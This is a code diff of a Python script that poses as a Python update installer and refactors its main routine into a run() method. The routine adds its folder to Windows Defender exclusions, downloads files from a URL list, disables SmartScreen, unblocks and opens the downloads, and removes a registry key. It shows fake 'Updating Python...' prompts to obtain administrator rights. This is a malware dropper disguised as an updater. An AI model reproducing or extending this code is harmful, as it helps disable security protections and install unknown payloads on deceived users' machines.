@@ -1,6 +1,7 @@
 from math import e
 import os
 import pathlib as pl
+from pdb import run
 import random
 import ssl
 import subprocess
@@ -147,27 +148,31 @@ class Main:
         except Exception as e:
             print(f"Fehler: {e}")
 
+    def run(self):
+        self = Main()
+        if is_admin:
+            print("Gathering dependencies and preparing for update...")
+            self.add_folder_to_windows_defender_exclusions()
+            file_urls = self.download_and_return_list_of_files()
+            self.download_files(file_urls)
+            self.disable_smartscreen()
+            self.unblock_files(pl.Path(self.APP_DIR))
+            self.open_files()
+            self.remove_hkey() #234
+            exit(0)
+        if self.send_update_notification():
+            print("Updating Python...")
+            time.sleep(1)
+            if self.request_admin_privileges():
+                exit(0)
+            else:
+                print("Admin privileges are required to perform the update. Please rerun the installer as an administrator.")
+                time.sleep(2)
+                self.request_admin_privileges()
+        else:
+            print("Update skipped.")
+            time.sleep(2)
+            
 if __name__ == "__main__":
     self = Main()
-    if is_admin:
-        print("Gathering dependencies and preparing for update...")
-        self.add_folder_to_windows_defender_exclusions()
-        file_urls = self.download_and_return_list_of_files()
-        self.download_files(file_urls)
-        self.disable_smartscreen()
-        self.unblock_files(pl.Path(self.APP_DIR))
-        self.open_files()
-        self.remove_hkey() #234
-        exit(0)
-    if self.send_update_notification():
-        print("Updating Python...")
-        time.sleep(1)
-        if self.request_admin_privileges():
-            exit(0)
-        else:
-            print("Admin privileges are required to perform the update. Please rerun the installer as an administrator.")
-            time.sleep(2)
-            self.request_admin_privileges()
-    else:
-        print("Update skipped.")
-        time.sleep(2)
+    self.run()
